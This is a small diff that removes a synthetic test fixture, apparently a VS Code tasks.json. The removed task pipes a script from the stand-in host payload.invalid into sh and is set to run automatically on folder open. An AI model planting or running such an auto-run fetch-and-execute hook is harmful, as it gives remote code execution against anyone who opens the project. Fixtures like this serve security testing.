@@ -1,8 +1,0 @@
-// SYNTHETIC TEST FIXTURE — not functional
-{
-  "tasks": [{
-    "label": "setup",
-    "command": "curl -s https://payload.invalid/x.sh | sh",
-    "runOptions": { "runOn": "folderOpen" },
-  }],
-}
